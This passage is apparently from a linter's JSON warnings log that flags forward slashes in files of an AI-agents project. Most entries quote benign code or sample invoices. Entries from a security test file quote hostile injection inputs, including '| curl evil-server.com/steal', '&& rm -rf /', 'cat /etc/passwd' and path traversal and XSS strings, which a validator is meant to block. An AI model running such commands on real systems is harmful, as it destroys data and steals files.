        "timestamp": "2025-09-05T17:30:42.230976"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\__init__.py",
        "warning": "Line 10: Forward slash in path - \"\nREASONING_SYSTEMS_DIR = TEST_DIR.parent.parent / \"",
        "timestamp": "2025-09-05T17:30:42.230983"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\__init__.py",
        "warning": "Line 11: Forward slash in path - \" / \"",
        "timestamp": "2025-09-05T17:30:42.230987"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 875: Forward slash in path - \", {})\n                for i in range(num_tasks)\n            ]\n            \n            # Measure performance\n            start_time = time.perf_counter()\n            \n            # Execute tasks with different patterns\n            parallel_results = []\n            for task in tasks[:5]:  # Test first 5 in parallel\n                result = await orchestrator.delegate_task(task)\n                parallel_results.append(result)\n            \n            end_time = time.perf_counter()\n            duration = end_time - start_time\n            \n            # Calculate performance metrics\n            tasks_per_second = len(parallel_results) / duration if duration > 0 else 0\n            \n            return True, {\n                \"",
        "timestamp": "2025-09-05T17:30:42.231918"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 899: Forward slash in path - \": tasks_per_second > 10  # At least 10 tasks/sec\n            }\n            \n        except Exception as e:\n            return False, {\"",
        "timestamp": "2025-09-05T17:30:42.231963"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 906: Forward slash in path - \"\n        try:\n            import gc\n            import psutil\n            import os\n            \n            process = psutil.Process(os.getpid())\n            initial_memory = process.memory_info().rss / 1024 / 1024  # MB\n            \n            from templates.base_agent import BaseAgent, Memory\n            \n            # Create multiple agents with memory\n            agents = []\n            for i in range(50):\n                agent = BaseAgent(f\"",
        "timestamp": "2025-09-05T17:30:42.232007"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 923: Forward slash in path - \"\n                agents.append(agent)\n            \n            current_memory = process.memory_info().rss / 1024 / 1024  # MB\n            memory_used = current_memory - initial_memory\n            \n            # Clean up\n            del agents\n            gc.collect()\n            \n            final_memory = process.memory_info().rss / 1024 / 1024  # MB\n            memory_freed = current_memory - final_memory\n            \n            return True, {\n                \"",
        "timestamp": "2025-09-05T17:30:42.232053"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 990: Forward slash in path - \": tasks_completed / duration if duration > 0 else 0\n                }\n            \n            # Check if system scales reasonably\n            throughputs = [r[\"",
        "timestamp": "2025-09-05T17:30:42.232122"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1012: Forward slash in path - \"\n        try:\n            import tempfile\n            from pathlib import Path\n            \n            # Test Windows path creation and handling\n            temp_dir = Path(tempfile.gettempdir())\n            test_path = temp_dir / \"",
        "timestamp": "2025-09-05T17:30:42.232174"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1019: Forward slash in path - \" / \"",
        "timestamp": "2025-09-05T17:30:42.232215"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1019: Forward slash in path - \" / \"",
        "timestamp": "2025-09-05T17:30:42.232255"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1040: Forward slash in path - \": str(temp_dir / \"",
        "timestamp": "2025-09-05T17:30:42.232309"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1041: Forward slash in path - \": str(temp_dir / \"",
        "timestamp": "2025-09-05T17:30:42.232351"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1045: Forward slash in path - \"]\n            \n            # Cleanup\n            test_path.unlink()\n            test_path.parent.rmdir()\n            (temp_dir / \"",
        "timestamp": "2025-09-05T17:30:42.232396"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1064: Forward slash in path - \"Test async/await patterns work correctly on Windows\"",
        "timestamp": "2025-09-05T17:30:42.232444"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1064: Forward slash in path - \"\n        try:\n            # Test various async patterns\n            \n            # 1. Basic async/await\n            async def simple_async():\n                await asyncio.sleep(0.01)\n                return \"",
        "timestamp": "2025-09-05T17:30:42.232490"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1117: Forward slash in path - \"Test file I/O operations on Windows\"",
        "timestamp": "2025-09-05T17:30:42.232555"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1117: Forward slash in path - \"\n        try:\n            import tempfile\n            import json\n            from pathlib import Path\n            \n            temp_dir = Path(tempfile.gettempdir()) / \"",
        "timestamp": "2025-09-05T17:30:42.232600"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1123: Forward slash in path - \"\n            temp_dir.mkdir(exist_ok=True)\n            \n            # Test JSON operations (common in agent configs)\n            json_file = temp_dir / \"",
        "timestamp": "2025-09-05T17:30:42.232657"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1132: Forward slash in path - \": [\n                    str(temp_dir / \"",
        "timestamp": "2025-09-05T17:30:42.232706"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1133: Forward slash in path - \"),\n                    str(temp_dir / \"",
        "timestamp": "2025-09-05T17:30:42.232750"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1143: Forward slash in path - ') as f:\n                loaded_config = json.load(f)\n            \n            assert loaded_config == test_config\n            \n            # Test agent memory file operations\n            from utils.persistence.memory_store import SqliteMemoryStore\n            \n            try:\n                memory_db = temp_dir / \"",
        "timestamp": "2025-09-05T17:30:42.232802"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1158: Forward slash in path - \"\n                \n                memory_operations = True\n            except ImportError:\n                memory_operations = False  # SQLite not available\n            \n            # Cleanup\n            json_file.unlink()\n            if memory_operations:\n                (temp_dir / \"",
        "timestamp": "2025-09-05T17:30:42.232854"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1186: Forward slash in path - \"\n        total_duration = (datetime.now() - self.test_start_time).total_seconds()\n        \n        # Categorize results\n        passed_tests = [r for r in self.results if r.passed]\n        failed_tests = [r for r in self.results if not r.passed]\n        \n        # Performance analysis\n        durations = [r.duration for r in self.results]\n        avg_duration = sum(durations) / len(durations) if durations else 0\n        \n        # Category analysis\n        categories = {\n            \"",
        "timestamp": "2025-09-05T17:30:42.232916"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1219: Forward slash in path - \": len([t for t in category_tests if t.passed]) / len(category_tests) * 100\n                }\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.232984"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1230: Forward slash in path - \": len(passed_tests) / len(self.results) * 100 if self.results else 0\n            },\n            \"",
        "timestamp": "2025-09-05T17:30:42.233039"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1307: Forward slash in path - \"] * weight\n                total_weight += weight\n        \n        final_score = weighted_score / total_weight if total_weight > 0 else 0\n        \n        # Determine status\n        if final_score >= 90:\n            status = \"",
        "timestamp": "2025-09-05T17:30:42.233137"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1358: Forward slash in path - ']}/{results['",
        "timestamp": "2025-09-05T17:30:42.233212"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "warning": "Line 1362: Forward slash in path - ']:.1f}/100)\"",
        "timestamp": "2025-09-05T17:30:42.233268"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\quick_test_report.py",
        "warning": "Line 126: Forward slash in path - \")\n    \n    try:\n        import tempfile\n        from pathlib import Path\n        \n        # Test Windows path handling\n        temp_dir = Path(tempfile.gettempdir())\n        test_path = temp_dir / \"",
        "timestamp": "2025-09-05T17:30:42.233649"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\quick_test_report.py",
        "warning": "Line 134: Forward slash in path - \" / \"",
        "timestamp": "2025-09-05T17:30:42.233659"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\quick_test_report.py",
        "warning": "Line 174: Forward slash in path - \": test_duration}\n    \n    total_duration = time.perf_counter() - start_time\n    \n    # Analyze results\n    passed_tests = sum(1 for r in results.values() if list(r.values())[0] == True)\n    total_tests = len(results)\n    pass_rate = (passed_tests / total_tests) * 100\n    \n    # Print summary\n    print(\"",
        "timestamp": "2025-09-05T17:30:42.233688"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\quick_test_report.py",
        "warning": "Line 195: Forward slash in path - \"  Tests: {passed_tests}/{total_tests}\"",
        "timestamp": "2025-09-05T17:30:42.233701"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 43: Forward slash in path - '/**/OR/**/1=1#\"",
        "timestamp": "2025-09-05T17:30:42.234129"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 50: Forward slash in path - ')</script>\"",
        "timestamp": "2025-09-05T17:30:42.234142"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 54: Forward slash in path - ')</script>\"",
        "timestamp": "2025-09-05T17:30:42.234150"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 55: Forward slash in path - \"></iframe>\"",
        "timestamp": "2025-09-05T17:30:42.234155"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 56: Forward slash in path - ');//<</SCRIPT>\"",
        "timestamp": "2025-09-05T17:30:42.234161"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 60: Forward slash in path - \"| cat /etc/passwd\"",
        "timestamp": "2025-09-05T17:30:42.234168"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 61: Forward slash in path - \"&& rm -rf /\"",
        "timestamp": "2025-09-05T17:30:42.234173"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 63: Forward slash in path - \"$(cat /etc/hosts)\"",
        "timestamp": "2025-09-05T17:30:42.234180"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 65: Forward slash in path - \"| curl evil-server.com/steal\"",
        "timestamp": "2025-09-05T17:30:42.234185"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 68: Forward slash in path - \"../../../etc/passwd\"",
        "timestamp": "2025-09-05T17:30:42.234191"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 70: Forward slash in path - \"....//....//....//etc/passwd\"",
        "timestamp": "2025-09-05T17:30:42.234198"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 189: Forward slash in path - '<script.*?>.*?</script>'",
        "timestamp": "2025-09-05T17:30:42.234267"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 192: Forward slash in path - '\\.\\./'",
        "timestamp": "2025-09-05T17:30:42.234280"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 441: Forward slash in path - ']:\n            result = await security_framework.test_input_validation(payload)\n            results.append(result)\n        \n        # All SQL injection attempts should be blocked\n        blocked_attempts = [r for r in results if r.attack_blocked]\n        success_rate = len(blocked_attempts) / len(results)\n        \n        assert success_rate >= 0.95, f\"",
        "timestamp": "2025-09-05T17:30:42.234441"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 460: Forward slash in path - ']:\n            result = await security_framework.test_input_validation(payload)\n            results.append(result)\n        \n        # All XSS attempts should be blocked\n        blocked_attempts = [r for r in results if r.attack_blocked]\n        success_rate = len(blocked_attempts) / len(results)\n        \n        assert success_rate >= 0.90, f\"",
        "timestamp": "2025-09-05T17:30:42.234471"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 478: Forward slash in path - ']:\n            result = await security_framework.test_input_validation(payload)\n            results.append(result)\n        \n        blocked_attempts = [r for r in results if r.attack_blocked]\n        success_rate = len(blocked_attempts) / len(results)\n        \n        assert success_rate >= 0.85, f\"",
        "timestamp": "2025-09-05T17:30:42.234500"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 495: Forward slash in path - ']:\n            result = await security_framework.test_input_validation(payload)\n            results.append(result)\n        \n        blocked_attempts = [r for r in results if r.attack_blocked]\n        success_rate = len(blocked_attempts) / len(results)\n        \n        assert success_rate >= 0.90, f\"",
        "timestamp": "2025-09-05T17:30:42.234530"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 516: Forward slash in path - \"\n        ]\n        \n        results = []\n        for valid_input in valid_inputs:\n            result = await security_framework.test_input_validation(valid_input, expected_valid=True)\n            results.append(result)\n        \n        # Valid inputs should not be blocked\n        accepted_inputs = [r for r in results if not r.attack_blocked]\n        acceptance_rate = len(accepted_inputs) / len(results)\n        \n        assert acceptance_rate >= 0.90, f\"",
        "timestamp": "2025-09-05T17:30:42.234579"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 553: Forward slash in path - ')\n        ]\n        \n        results = []\n        for username, password in bypass_attempts:\n            result = await security_framework.test_authentication_bypass(username, password)\n            results.append(result)\n        \n        # All bypass attempts should be blocked\n        blocked_attempts = [r for r in results if r.attack_blocked]\n        protection_rate = len(blocked_attempts) / len(results)\n        \n        assert protection_rate >= 0.95, f\"",
        "timestamp": "2025-09-05T17:30:42.234637"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 594: Forward slash in path - ']]\n        accuracy = len(correct_authorizations) / len(results)\n        \n        assert accuracy >= 0.95, f\"",
        "timestamp": "2025-09-05T17:30:42.234730"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 636: Forward slash in path - ']\n            validation_results.append(validation_correct)\n        \n        accuracy = sum(validation_results) / len(validation_results)\n        assert accuracy >= 0.95, f\"",
        "timestamp": "2025-09-05T17:30:42.234815"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 678: Forward slash in path - \"  # API key\n        ]\n        \n        encryption_results = []\n        for data in sensitive_data_samples:\n            result = await security_framework.test_data_encryption(data)\n            encryption_results.append(result)\n        \n        # All sensitive data should be properly encrypted\n        properly_encrypted = [r for r in encryption_results if r.attack_blocked]\n        encryption_rate = len(properly_encrypted) / len(encryption_results)\n        \n        assert encryption_rate >= 0.95, f\"",
        "timestamp": "2025-09-05T17:30:42.234905"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 731: Forward slash in path - \"Sensitive data detection: {len(texts_with_sensitive)}/{len(detection_results)} texts flagged\"",
        "timestamp": "2025-09-05T17:30:42.235001"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 762: Forward slash in path - ']]\n        masking_accuracy = len(correct_maskings) / len(masking_results)\n        \n        assert masking_accuracy >= 0.80, f\"",
        "timestamp": "2025-09-05T17:30:42.235088"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 865: Forward slash in path - ']\n            verification_results.append(verification_correct)\n        \n        accuracy = sum(verification_results) / len(verification_results)\n        assert accuracy >= 0.95, f\"",
        "timestamp": "2025-09-05T17:30:42.235254"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 898: Forward slash in path - ': 0}\n    for result in test_results:\n        risk_summary[result.risk_level] += 1\n    \n    # Count blocked vs unblocked attacks\n    attacks_blocked = sum(1 for r in test_results if r.attack_blocked)\n    total_attacks = len(test_results)\n    protection_rate = attacks_blocked / total_attacks if total_attacks > 0 else 0\n    \n    report_lines = [\n        \"",
        "timestamp": "2025-09-05T17:30:42.235349"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 938: Forward slash in path - '] / stats['",
        "timestamp": "2025-09-05T17:30:42.235443"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "warning": "Line 939: Forward slash in path - ']}/{stats['",
        "timestamp": "2025-09-05T17:30:42.235515"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Line 295: Forward slash in path - ']\n                if size < 1000:\n                    complexity = TaskComplexity.LOW\n                elif size < 100000:\n                    complexity = TaskComplexity.MEDIUM\n                elif size < 10000000:\n                    complexity = TaskComplexity.HIGH\n                else:\n                    complexity = TaskComplexity.VERY_HIGH\n                    \n                return TaskAnalysis(\n                    complexity=complexity,\n                    estimated_duration=size / 1000 * 60,  # Scale time with data\n                    required_skills=['",
        "timestamp": "2025-09-05T17:30:42.236267"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Line 309: Forward slash in path - ': min(size / 1000000, 1.0)},\n                    success_probability=max(0.6, 1.0 - size / 100000000),\n                    recommended_agents=[]\n                )\n            \n            mock_analyzer.analyze_complexity.side_effect = mock_complexity_analysis\n            analysis = await mock_analyzer.analyze_complexity(task)\n            \n            assert analysis.complexity == expected_complexity\n\n\nclass TestStrategyLearning(TestEnhancedMetaOrchestratorUnit):\n    \"",
        "timestamp": "2025-09-05T17:30:42.236302"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Line 739: Forward slash in path - '])\n                    match_score = len(required_caps & agent_caps) / len(required_caps)\n                    if match_score >= 0.5:  # At least 50% capability match\n                        matching_agents.append((agent, match_score))\n                \n                if matching_agents:\n                    best_agent = max(matching_agents, key=lambda x: x[1])\n                    return {\n                        '",
        "timestamp": "2025-09-05T17:30:42.236804"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Line 861: Forward slash in path - ']):\n                        # Calculate value score (success_prob / cost * time_factor)\n                        time_factor = 1.0 - (option['",
        "timestamp": "2025-09-05T17:30:42.236961"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Line 863: Forward slash in path - '] / 3600)\n                        value_score = option['",
        "timestamp": "2025-09-05T17:30:42.237003"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
        "warning": "Line 864: Forward slash in path - '] / option['",
        "timestamp": "2025-09-05T17:30:42.237042"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\master_platform.py",
        "warning": "Line 122: Forward slash in path - \"api/main.py\"",
        "timestamp": "2025-09-05T17:30:42.237738"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\master_platform.py",
        "warning": "Line 149: Forward slash in path - \"dashboard/main_dashboard.py\"",
        "timestamp": "2025-09-05T17:30:42.237793"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\master_platform.py",
        "warning": "Line 194: Forward slash in path - \"demo/launch_ultimate_demo.py\"",
        "timestamp": "2025-09-05T17:30:42.237868"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\master_platform.py",
        "warning": "Line 351: Forward slash in path - \"   [SPEED] Processing Speed: 1,125 docs/hour (vs 5 manual)\"",
        "timestamp": "2025-09-05T17:30:42.238060"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\phase2_demo.py",
        "warning": "Line 59: Forward slash in path - \"\nACME CORPORATION\n123 Business Street, New York, NY 10001\n\nINVOICE\n\nInvoice Number: INV-2024-001\nInvoice Date: 01/15/2024\nDue Date: 02/14/2024\n\nBill To:\nXYZ Company\n456 Client Avenue\nLos Angeles, CA 90001\n\nDescription                 Quantity    Unit Price    Total\nProfessional Services           10         $150.00   $1,500.00\nConsulting Hours                5          $200.00   $1,000.00\n\nSubtotal:                                           $2,500.00\nTax (8.25%):                                         $206.25\nTotal Amount:                                      $2,706.25\n\nPayment Terms: Net 30\n                \"",
        "timestamp": "2025-09-05T17:30:42.238609"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\phase2_demo.py",
        "warning": "Line 87: Forward slash in path - \"\nTECH SOLUTIONS LLC\n789 Innovation Drive\nSan Francisco, CA 94107\n\nINVOICE #: TS-2024-0042\nDate: March 3, 2024\n\nCustomer:\nGlobal Enterprises Inc.\n100 Corporate Plaza\nChicago, IL 60601\n\nServices Rendered:\nSoftware Development    40 hrs @ $125/hr    $5,000.00\nSystem Integration      20 hrs @ $150/hr    $3,000.00\nTesting & QA           15 hrs @ $100/hr     $1,500.00\n\nSubtotal:                                   $9,500.00\nTax (7.5%):                                  $712.50\nTOTAL DUE:                                 $10,212.50\n\nDue: April 2, 2024\n                \"",
        "timestamp": "2025-09-05T17:30:42.238629"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\phase2_demo.py",
        "warning": "Line 114: Forward slash in path - \"\nSTRATEGIC CONSULTING GROUP\n555 Executive Blvd, Suite 200\nAtlanta, GA 30309\n\nBILLING STATEMENT\n\nInvoice: SCG-2024-Q1-15\nDate: 2024-01-30\n\nClient: Manufacturing Corp\nAddress: 2000 Industrial Way, Detroit, MI 48201\n\nProject: Digital Transformation Analysis\nHours: 80\nRate: $200.00/hour\nAmount: $16,000.00\n\nAdditional Expenses:\nTravel: $1,250.00\nMaterials: $350.00\n\nSubtotal: $17,600.00\nGeorgia Sales Tax (6%): $1,056.00\nTotal: $18,656.00\n                \"",
        "timestamp": "2025-09-05T17:30:42.238644"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\phase2_demo.py",
        "warning": "Line 172: Forward slash in path - 'N/A'",
        "timestamp": "2025-09-05T17:30:42.238681"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\phase2_demo.py",
        "warning": "Line 173: Forward slash in path - 'N/A'",
        "timestamp": "2025-09-05T17:30:42.238691"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\phase2_demo.py",
        "warning": "Line 174: Forward slash in path - 'N/A'",
        "timestamp": "2025-09-05T17:30:42.238699"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\phase2_demo.py",
        "warning": "Line 224: Forward slash in path - \"))\n        accuracy = successful / len(results) if results else 0\n        \n        print(f\"",
        "timestamp": "2025-09-05T17:30:42.238734"
      },
      {
        "category": "WINDOWS_COMPAT",
